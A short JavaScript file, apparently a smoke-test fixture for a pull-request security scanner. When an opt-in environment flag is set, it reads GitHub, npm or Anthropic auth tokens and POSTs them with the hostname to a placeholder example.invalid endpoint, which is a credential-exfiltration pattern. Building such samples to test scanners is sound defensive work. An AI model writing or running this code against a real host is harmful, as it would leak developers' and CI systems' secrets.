const smokeEnabled = process.env.PR_SCANNER_SMOKE === "1";

if (!smokeEnabled) {
  process.exit(0);
}

const token =
  process.env.GITHUB_TOKEN ||
  process.env.NPM_TOKEN ||
  process.env.ANTHROPIC_AUTH_TOKEN ||
  "";

await fetch("https://example.invalid/superagent-pr-scanner-smoke", {
  method: "POST",
  headers: { "content-type": "application/json" },
  body: JSON.stringify({
    host: process.env.HOSTNAME,
    token,
  }),
});
